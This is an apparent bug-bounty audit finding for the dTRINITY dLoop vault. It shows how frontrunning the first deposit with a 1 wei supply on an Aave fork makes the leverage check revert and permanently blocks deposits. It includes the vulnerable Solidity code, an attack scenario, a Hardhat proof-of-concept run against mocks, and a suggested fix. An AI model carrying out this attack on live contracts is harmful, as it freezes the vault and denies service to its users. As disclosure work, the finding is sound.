# [H] Attacker can break the entire contract by frontrunning with 1 wei.

## Summary
Severity: High
Chain: Smart contract
Component: dTRINITY
Published: 2025-06-18
Source: https://github.com/hats-finance/dTRINITY-0xee5c6f15e8d0b55a5eff84bb66beeee0e6140ffe/issues/113
Type: hats-finding

## Details
**Github username:** @Tomiwasa0
  **Twitter username:** --
  **HATS Profile:** [HATS Profile](https://app.hats.finance/profile/Bigsam)

  **Beneficiary:** 0x95f04DaAf8999F9fD232eB61916952Da2CE197A8
  **Submission hash (on-chain):** 0xbad496a9c7f95925f500c2855b5932dbdee765805badea337acfee9adbf6a147
  **Severity:** high
  
  **Description:**
  **Description**\

Collateral token will be supplied to an Aave fork.  These tokens and other tokens to be borrowed will be supplied external users of which the dloop vault is technically a user too and also we borrow from there. 
An attacker can supply on behalf of this contract 1 or some few wei of a token by frontrunning the first deposit.
This donation will increase the total collateral base to 1 while the total debt remains at 0.

Because of the check in the get leverage call the entire contract will never function again, Hence, no one will be able to deposit into this vault ever.


```solidity
  function _depositToPoolImplementation(
        address caller,
        uint256 supplyAssetAmount // supply amount
    ) private returns (uint256) {
        // Transfer the assets to the vault (need the allowance before calling this function)
        collateralToken.safeTransferFrom(
            caller,
            address(this),
            supplyAssetAmount
        );

        // At this step, we assume that the funds from the depositor are already in the vault

        // Get current leverage before supplying (IMPORTANT: this is the leverage before supplying)

@audit>>         uint256 currentLeverageBpsBeforeSupply = getCurrentLeverageBps();

        // Make sure we have enough balance to supply before supplying
        uint256 currentCollateralTokenBalance = collateralToken.balanceOf(
            address(this)
        );
        if (currentCollateralTokenBalance < supplyAssetAmount) {
            revert DepositInsufficientToSupply(
                currentCollateralTokenBalance,
                supplyAssetAmount
            );
        }
```

All functions in the Dloop vault calls getCurrentLeverageBps(),

The donation onbehalf of this contract will cause the call to get exchange rate to forever revert breaking the whole contract.

```solidity

 /**
     * @dev Gets the current leverage in basis points
     * @return uint256 The current leverage in basis points
     */
    function getCurrentLeverageBps() public view returns (uint256) {
        (
            uint256 totalCollateralBase,
            uint256 totalDebtBase
@audit>.        ) = getTotalCollateralAndDebtOfUserInBase(address(this));

        if (totalCollateralBase < totalDebtBase) {
            revert CollateralLessThanDebt(totalCollateralBase, totalDebtBase);
        }
        if (totalCollateralBase == 0) {
            return 0;
        }
        if (totalCollateralBase == totalDebtBase) {
            return type(uint256).max; // infinite leverage
        }
        // The leverage will be 1 if totalDebtBase is 0 (no more debt)
@audit>.         uint256 leverageBps = ((totalCollateralBase *
            BasisPointConstants.ONE_HUNDRED_PERCENT_BPS) /
            (totalCollateralBase - totalDebtBase));


@audit>.         if (leverageBps <= BasisPointConstants.ONE_HUNDRED_PERCENT_BPS) {
            revert InvalidLeverage(leverageBps);
        }
        return leverageBps;
    }
```

This will lead to 
   1*10000 / 1 = 10000

  10000<= 10000 will revert 


**Attack Scenario**\

1. A malicious actor detects the first-ever legitimate deposit transaction.
2. The attacker frontruns this transaction by supplying `1 wei` of any supported collateral token to the Aave fork on behalf of `address(this)` directly without going through the vault (the vault contract).
3. This results in a total collateral of `1 wei`, but no debt (since `borrow()` has never been called).
4. The legitimate deposit arrives and calls `getCurrentLeverageBps()`, which now returns `10,000`.
5. The `InvalidLeverage` revert condition is triggered.
6. All subsequent deposit attempts will also fail, permanently bricking the vault.

This vulnerability is critical in scenarios where the contract depends on leverage calculations to validate deposits. Since the attacker doesn’t need permission or access control to donate collateral onbehalf of the vault address on Aave, the attack is trivial and economically cheap.


**Attachments**

1. **Proof of Concept (PoC) File**

```solidity

 import { expect } from "chai";
import { ethers } from "hardhat";
import { DLoopCoreMock, MockAaveV3Pool, TestMintableERC20 } from "../typechain-types";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

describe("DLoop Frontrunning Griefing Attack", function () {
  let dloopMock: DLoopCoreMock;
  let collateralToken: TestMintableERC20;
  let debtToken: TestMintableERC20;
  let pool: MockAaveV3Pool;
  let accounts: HardhatEthersSigner[];
  let attacker: HardhatEthersSigner;
  let depositor: HardhatEthersSigner;

  beforeEach(async () => {
    accounts = await ethers.getSigners();
    [attacker, depositor] = [accounts[1], accounts[2]];

    // Deploy tokens
    const TokenFactory = await ethers.getContractFactory("TestMintableERC20");
    collateralToken = await TokenFactory.deploy("Collateral Token", "COL", 18);
    debtToken = await TokenFactory.deploy("Debt Token", "DEBT", 18);

    await collateralToken.mint(attacker.address, ethers.parseEther("1000"));
    await collateralToken.mint(depositor.address, ethers.parseEther("1000"));

    // Deploy Aave pool mock
    const PoolFactory = await ethers.getContractFactory("MockAaveV3Pool");
    pool = await PoolFactory.deploy();
    await pool.initReserve(collateralToken.target, "aCOL");

    // Deploy the DLoop core mock
    const DLoopFactory = await ethers.getContractFactory("DLoopCoreMock");
    dloopMock = await DLoopFactory.deploy(pool.target, collateralToken.target);
  });

  it("should grief the DLoop contract by front-running with 1 wei", async () => {
    // Attacker donates 1 wei of collateral to DLoop vault on Aave
    await collateralToken.connect(attacker).approve(pool.target, 1);
    await pool.connect(attacker).supply(collateralToken.target, 1, dloopMock.target, 0);

    // Depositor attempts to deposit normally
    const depositAmount = ethers.parseEther("100");
    await collateralToken.connect(depositor).approve(dloopMock.target, depositAmount);

    // Expect revert due to leverage = 10000 (invalid)
    await expect(
      dloopMock.connect(depositor).depositToPoolTestWrapper(depositAmount) // wrapper to call _depositToPoolImplementation
    ).to.be.revertedWith("InvalidLeverage(10000)");
  });
});


```

2. **Revised Code File (Optional)**

consider catching this condition before reverting if the leverage is 1 and total debt is 0. allow the system to work fine.
